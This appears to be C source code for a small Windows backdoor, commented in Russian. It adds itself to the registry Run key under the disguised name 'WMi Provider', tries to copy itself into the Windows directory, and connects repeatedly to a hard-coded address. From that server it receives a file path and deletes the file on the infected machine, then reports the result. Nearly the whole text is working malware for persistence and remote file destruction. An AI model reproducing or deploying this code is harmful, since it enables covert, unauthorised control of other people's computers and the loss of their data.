#undef UNICODE
#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <tchar.h>

// Need to link with Ws2_32.lib, Mswsock.lib, and Advapi32.lib
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")


#define DEFAULT_BUFLEN 512
#define DEFAULT_PORT "27016"

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int)
{
    //автозагрузка
    TCHAR thisfile[256];
    GetModuleFileName(NULL, thisfile, 256);
    HKEY hg;
    RegOpenKeyEx(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hg);
    RegSetValueEx(hg, "WMi Provider", 0, REG_SZ, (const unsigned char*)thisfile, strlen(thisfile));
    RegCloseKey(hg);

    //копирование в системный каталог
    TCHAR buf[256];
    GetWindowsDirectory(buf, 256);
    int len2 = strlen(buf);
    int i;
    for (i = strlen(thisfile); thisfile[i] != '\\'; i--);
    char itog[256];
    strcpy(itog, buf);
    itog[len2] = '\\';
    for (i++, len2++; thisfile[i] != '\0'; i++, len2++) itog[len2] = thisfile[i];
    itog[len2] = '\0';
    MoveFile(thisfile, itog);

    //инициализация Winsock
    WSADATA wsaData;
    SOCKET ConnectSocket = INVALID_SOCKET;
    struct addrinfo* result = NULL,* ptr = NULL, hints;

    int iResult;
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        printf("WSAStartup failed with error: %d\n", iResult);
        return 1;
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    //Передача адреса серверу
    //192.168.1.103
    //192.168.43.79 REDMI
    //192.168.0.109 HOME
    iResult = getaddrinfo("192.168.1.103", DEFAULT_PORT, &hints, &result);
    if (iResult != 0) {
        printf("getaddrinfo failed with error: %d\n", iResult);
        WSACleanup();
        return 1;
    }

    //Попытки соединения
    for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
        //Сокет для соединения
        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
        if (ConnectSocket == INVALID_SOCKET) {
            printf("socket failed with error: %ld\n", WSAGetLastError());
            WSACleanup();
            return 1;
        }

        //Соединение с сервером
        while (iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen) == SOCKET_ERROR);
        if (iResult == SOCKET_ERROR) {
            closesocket(ConnectSocket);
            ConnectSocket = INVALID_SOCKET;
            continue;
        }
        break;
    }

    freeaddrinfo(result);

    if (ConnectSocket == INVALID_SOCKET) {
        printf("Unable to connect to server!\n");
        WSACleanup();
        return 1;
    }

    //получение и удаленное удаление файла
    char put[60];
    memset(put, 0, 60);
    recv(ConnectSocket, put, sizeof(put), 0);
    puts(put);

    char put2[50];
    memset(put2, 0, 50);
    recv(ConnectSocket, put2, sizeof(put2), 0);
    puts(put2);

    char otpr[11];
    if (remove(put2) == 0)
    {
        strcpy(otpr, "Performed\0");
        puts(otpr);
        send(ConnectSocket, otpr, sizeof(otpr), 0);
    }

    else
    {
        strcpy(otpr, "Error\0");
        puts(otpr);
        send(ConnectSocket, otpr, sizeof(otpr), 0);
    }

    //закрытие сокета
    closesocket(ConnectSocket);
    WSACleanup();

    return 0;
}
